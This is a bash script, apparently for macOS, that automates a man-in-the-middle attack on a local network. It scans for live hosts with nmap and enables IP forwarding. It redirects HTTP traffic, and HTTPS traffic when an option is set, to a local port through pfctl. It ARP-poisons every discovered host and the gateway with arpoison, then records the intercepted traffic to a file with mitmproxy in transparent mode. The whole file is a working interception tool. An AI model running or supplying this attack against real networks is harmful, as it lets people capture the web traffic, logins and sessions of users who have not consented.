#!/bin/bash
# Utils
function timestamp() {
  date +"%Y-%m-%d_%H-%M-%S"
}

# COLORS
RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m' # No Color
BOLD='\033[1m'
NOFO='\033[00m'
OK="${GREEN}[+] ${NC}"
FAIL="${RED}[-] ${NC}"

# Check if root privileges are available, nmap and arpoisen need this privileges.
if [[ $UID != 0 && $EUID != 0 ]]; then
	echo -e "${FAIL}Need root privileges to start arpoison and nmap"
	exit
fi

# Parse arguments
while [[ $# > 1 ]]
do
key="$1"
case $key in
    -i|--interface)
    INTERFACE="$2"
    shift # past argument
    ;;
    -g|--gateway)
    GATEWAY="$2"
    shift # past argument
    ;;
    -n|--network)
    TARGET_NETWORK="$2"
    shift # past argument
    ;;
    -m|--network-mask)
    NETWORK_MASK="$2"
    shift # past argument
    ;;
    -p|--proxy-port)
    PROXYPORT="$2"
    shift # past argument
    ;;
    -s|--secure-traffic)
	if [ "$2" != "0" ]; then
    	GETHTTPS=1
	fi
    shift # past argument
    ;;
    -o|--output)
    OUTPUT="$2"
    shift # past argument
    ;;
    
    --default)
    DEFAULT=YES
    ;;
    *)
            # unknown option
    ;;
esac
shift # past argument or value
done
USAGE=0
PASSHTTPSTHROUGH=1
# Required input parameter
if [ -z "$INTERFACE" ]; then
	USAGE=1
fi	

if [ -z "$GATEWAY" ]; then
	USAGE=1
fi	

if [ -z "$TARGET_NETWORK" ]; then
	USAGE=1
fi	

if [ "$GETHTTPS" == "1" ]; then
	PASSHTTPSTHROUGH=0
fi	

# Optional parameter
if [ -z "$OUTPUT" ]; then
	OUTPUT="./sniff_file_"`timestamp`".flow"
fi	

if [ -z "$NETWORK_MASK" ]; then
	NETWORK_MASK=24
fi	

if [ -z "$PROXYPORT" ]; then
	PROXYPORT=8080
fi	

if [ "$USAGE" != "0" ]; then

	echo -e "Usage: $0 [-i|--interface] [-g|--gateway] [-n|--network] [-o|--output] [-m|--network-mask] [-p|--proxy-port] [-s|--secure-traffic]"
	echo -e ""
	echo -e "${BOLD}Required:${NOFO}"
	echo -e "	-i | --interface	interface		(Example: en0, wlan0)"
	echo -e "	-g | --gateway		Gateway			(Example: 10.0.0.1, 192.168.0.1)"
	echo -e "	-n | --network		Target network		(Example: 10.0.0.0, 192.168.0.0)"
	echo -e ""
	echo -e "${BOLD}Optional:${NOFO}"
	echo -e "	-o | --output		Output file		(Default: ./sniff_file_"`timestamp`".flow)"
	echo -e "	-m | --network-mask 	Network mask		(Default: 24)"
	echo -e "	-p | --proxy-port 	Proxyport		(Default: 8080)"
	echo -e "	-s | --secure-traffic	Get HTTPS traffic 	(Default: 0 [0 = false, 1 = true])"
	exit 0
fi

## Get remote and local informations
echo -e "${OK}Get network informations"
GATEWAY_MAC=`arp -an | grep "($GATEWAY)" | awk '{print $4}'`
LOCAL_IP=`ifconfig $INTERFACE | grep "inet " | awk '{print $2}'`
LOCAL_MAC=`ifconfig $INTERFACE | grep "ether" | awk '{print $2}'`
TARGET_HOSTS=(`nmap --exclude $GATEWAY,$LOCAL_IP -sP -n -oG - $TARGET_NETWORK/$NETWORK_MASK | grep "Up" | awk '{print $2" "}'`)
#TARGET_HOSTS=("10.10.10.23")
echo -e "${OK}- Gateway MAC: $GATEWAY_MAC"
echo -e "${OK}- Local IP in network: $LOCAL_IP"
echo -e "${OK}- Local MAC: $LOCAL_MAC"
TARGETLENGTH=${#TARGET_HOSTS[@]}
if [ "$TARGETLENGTH" == "0" ]; then
	echo -e "${FAIL}No targets found"
	exit 0
fi
#echo -e "${OK}- Potential targets: ${TARGET_HOSTS[@]}"

## Scan for targets
# Get targets ip and mac
echo -e "${OK}Get targets from network"
for idx in ${!TARGET_HOSTS[@]}; do
	cnt=`expr $idx + 1`
	echo -e "${OK}-> ${GREEN}Target #$cnt found: ${NC}${TARGET_HOSTS[$idx]}"
	TARGETS[$idx]=$(arp -an | grep "(${TARGET_HOSTS[$idx]})" | awk -v target="${TARGET_HOSTS[$idx]}" '{print target" "$4}')
done 

NETWORKTARGETSLENGTH=${#TARGETS[@]}
if [ "$NETWORKTARGETSLENGTH" == "0" ]; then
	echo -e "${FAIL}No targets available"
	exit 0
fi

## Setup system 
# Activate ip forwarding
echo -e "${OK}Activate ip forwarding"
sysctl -w net.inet.ip.forwarding=1 > /dev/null 2>&1 
# Rounting traffic from incoming on port 80 and 443 to mitmproxy 
HTTPROUTE="rdr pass inet proto tcp from any to any port 80 -> 127.0.0.1 port $PROXYPORT"
HTTPSROUTE="rdr pass inet proto tcp from any to any port 443 -> 127.0.0.1 port $PROXYPORT"

ROUTE="$HTTPROUTE"
if [ "$PASSHTTPSTHROUGH" != "1" ]; then
	ROUTE="$HTTPROUTE\n$HTTPSROUTE\n"
fi

echo -e "${OK}Setup port routing"
echo -e "$ROUTE" | sudo pfctl -ef - > /dev/null 2>&1

## Poisen targets and gateway
echo -e "${OK}Poisen targets"
for tidx in ${!TARGETS[@]}; do
	TARGET_IP_MAC=(${TARGETS[$tidx]})
	TARGET_IP=${TARGET_IP_MAC[0]}
	TARGET_MAC=${TARGET_IP_MAC[1]}
	echo -e "${OK}Poisen: $GATEWAY -> $TARGET_IP" 
	echo -e "${OK}Poisen: $TARGET_IP -> $GATEWAY"
	GATEWAYPID=`arpoison -i $INTERFACE -d $GATEWAY -s $TARGET_IP -t $GATEWAY_MAC -r $LOCAL_MAC -w 5 > /dev/null 2>&1 & echo $!`
	TARGETPID=`arpoison -i $INTERFACE -d $TARGET_IP -s $GATEWAY -t $TARGET_MAC -r $LOCAL_MAC -w 5 > /dev/null 2>&1 & echo $!`
	PIDS[$tidx]="$GATEWAYPID $TARGETPID"
done

## Cleanup and reset by interupting or exiting
function cleanup () {
	echo -e "${OK}Cleanup system ..."

	echo -e "${OK}Kill processes"

	for pid in ${!PIDS[@]}; do
		TOKILL=(${PIDS[$pid]})
		kill ${TOKILL[0]}
		kill ${TOKILL[1]}
	done
	# Disable ip forwarding 
	echo -e "${OK}Disable ip forwarding"
	sysctl -w net.inet.ip.forwarding=0 > /dev/null 2>&1 
	
	# Reset pfctl
	echo -e "${OK}Reset port forwarding"
	pfctl -F all -f /etc/pf.conf > /dev/null 2>&1 
}

trap cleanup SIGTERM EXIT

## Start mitmproxy
echo -e "${OK}Start proxy"
echo -e "${OK}Proxy flow file: $OUTPUT" 
mitmproxy -T --host -z --anticache -w $OUTPUT -p $PROXYPORT

